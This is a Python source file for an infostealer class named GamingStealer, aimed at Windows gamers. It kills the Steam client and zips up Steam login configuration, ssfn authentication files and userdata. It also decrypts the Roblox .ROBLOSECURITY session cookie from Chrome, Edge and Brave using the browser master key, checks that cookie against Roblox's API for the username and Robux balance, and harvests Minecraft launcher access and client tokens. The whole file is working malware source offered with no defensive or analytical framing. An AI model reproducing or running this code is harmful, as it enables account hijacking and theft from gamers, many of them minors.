import os
import re
import json
import shutil
import subprocess
import zipfile
import winreg
from . import utils

class GamingStealer:
    def __init__(self):
        self.steam = {}
        self.roblox = {}
        self.minecraft = {}

    def find_steam_path(self):
        candidates = [
            r'C:\Program Files (x86)\Steam',
            r'C:\Program Files\Steam',
        ]
        for path in candidates:
            if os.path.exists(os.path.join(path, 'steam.exe')):
                return path
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Valve\Steam')
            steam_path = winreg.QueryValueEx(key, 'SteamPath')[0]
            winreg.CloseKey(key)
            if os.path.exists(steam_path):
                return steam_path
        except:
            pass
        return None

    def parse_vdf(self, content):
        result = {}
        try:
            for line in content.split('\n'):
                line = line.strip()
                m = re.match(r'"(\d+)"\s*$', line)
                if m:
                    steam_id = m.group(1)
                    result[steam_id] = {}
                m = re.match(r'"(\w+)"\s*"([^"]*)"', line)
                if m:
                    key, value = m.group(1), m.group(2)
                    if steam_id:
                        result[steam_id][key] = value
        except:
            pass
        return result

    def steal_steam(self):
        steam_path = self.find_steam_path()
        if not steam_path:
            return

        try:
            subprocess.run('taskkill /f /im steam.exe', shell=True, capture_output=True, timeout=5)
        except:
            pass

        config_dir = os.path.join(steam_path, 'config')
        vdf_path = os.path.join(config_dir, 'loginusers.vdf')
        ssfn_files = []

        for root, dirs, files in os.walk(steam_path):
            for file in files:
                if file.lower().startswith('ssfn'):
                    ssfn_files.append(os.path.join(root, file))

        accounts = {}
        account_names = []

        if os.path.exists(vdf_path):
            try:
                with open(vdf_path, 'r', encoding='utf-8', errors='ignore') as f:
                    vdf_content = f.read()
                parsed = self.parse_vdf(vdf_content)
                for sid, info in parsed.items():
                    name = info.get('PersonaName', 'Unknown')
                    remember = info.get('RememberPassword', '0')
                    account_names.append(name)
                    accounts[sid] = {
                        'name': name,
                        'remember_password': remember == '1',
                        'steam_id': sid,
                    }
            except:
                pass

        temp_dir = os.path.join(utils.get_temp(), 'sv_steam_' + utils.generate_id())
        os.makedirs(temp_dir, exist_ok=True)

        try:
            config_backup = os.path.join(temp_dir, 'config')
            if os.path.exists(config_dir):
                shutil.copytree(config_dir, config_backup, ignore_dangling_symlinks=True)

            for ssfn in ssfn_files:
                try:
                    shutil.copy2(ssfn, os.path.join(temp_dir, os.path.basename(ssfn)))
                except:
                    pass

            userdata_path = os.path.join(steam_path, 'userdata')
            if os.path.exists(userdata_path):
                userdata_backup = os.path.join(temp_dir, 'userdata')
                shutil.copytree(userdata_path, userdata_backup, ignore_dangling_symlinks=True)

            steam_reg_path = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Valve\Steam')
                steam_path_reg = winreg.QueryValueEx(key, 'SteamPath')[0]
                steam_reg_path = steam_path_reg
                winreg.CloseKey(key)
            except:
                pass

            zip_path = os.path.join(utils.get_temp(), 'sv_steam_data_' + utils.generate_id() + '.zip')
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(temp_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, temp_dir)
                        zf.write(file_path, arcname)

            self.steam = {
                'found': len(accounts) > 0 or len(ssfn_files) > 0,
                'path': steam_path,
                'accounts': accounts,
                'account_names': account_names,
                'ssfn_count': len(ssfn_files),
                'reg_path': steam_reg_path,
                'zip_path': zip_path,
            }
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    def steal_roblox(self):
        try:
            local_state_path = os.path.join(utils.get_localappdata(), 'Google', 'Chrome', 'User Data', 'Local State')
            if not os.path.exists(local_state_path):
                return
            master_key = utils.get_master_key(local_state_path)
            if not master_key:
                return

            cookie_paths = [
                os.path.join(utils.get_localappdata(), 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
                os.path.join(utils.get_localappdata(), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
                os.path.join(utils.get_localappdata(), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Network', 'Cookies'),
                os.path.join(utils.get_localappdata(), 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies'),
                os.path.join(utils.get_localappdata(), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Network', 'Cookies'),
            ]

            roblox_cookie = None
            for cp in cookie_paths:
                if not os.path.exists(cp):
                    continue
                import sqlite3
                import shutil
                temp_db = os.path.join(utils.get_temp(), 'sv_rb_' + utils.generate_id() + '.db')
                try:
                    shutil.copy2(cp, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox%' AND name='.ROBLOSECURITY'")
                    row = cursor.fetchone()
                    if row:
                        enc_value = row[1]
                        roblox_cookie = utils.decrypt_chrome_password(enc_value, master_key)
                    cursor.close()
                    conn.close()
                except:
                    pass
                finally:
                    try:
                        os.remove(temp_db)
                    except:
                        pass
                if roblox_cookie:
                    break

            if roblox_cookie:
                headers = {
                    'Cookie': '.ROBLOSECURITY=' + roblox_cookie,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                }
                code, data = utils.http_get('https://www.roblox.com/mobileapi/userinfo', headers, 10)
                if code == 200:
                    info = json.loads(data.decode('utf-8'))
                    self.roblox = {
                        'cookie': roblox_cookie,
                        'username': info.get('UserName', 'Unknown'),
                        'id': info.get('UserID', 'Unknown'),
                        'robux': info.get('RobuxBalance', 0),
                        'premium': info.get('IsPremium', False),
                        'avatar': info.get('ThumbnailUrl', ''),
                    }
        except:
            pass

    def steal_minecraft(self):
        mc_path = os.path.join(utils.get_appdata(), '.minecraft')
        if not os.path.exists(mc_path):
            return
        launcher_accounts = os.path.join(mc_path, 'launcher_accounts.json')
        if os.path.exists(launcher_accounts):
            try:
                with open(launcher_accounts, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                accounts = []
                for acc_id, acc_info in data.get('accounts', {}).items():
                    token = acc_info.get('accessToken', 'N/A')
                    accounts.append({
                        'username': acc_info.get('minecraftProfile', {}).get('name', 'Unknown'),
                        'uuid': acc_info.get('minecraftProfile', {}).get('id', 'Unknown'),
                        'access_token': token[:30] + '...' if token != 'N/A' else 'N/A',
                    })
                self.minecraft['accounts'] = accounts
            except:
                pass
        launcher_profiles = os.path.join(mc_path, 'launcher_profiles.json')
        if os.path.exists(launcher_profiles):
            try:
                with open(launcher_profiles, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                if 'clientToken' in data:
                    self.minecraft['client_token'] = data['clientToken']
            except:
                pass

    def steal_all(self):
        self.steal_steam()
        self.steal_roblox()
        self.steal_minecraft()
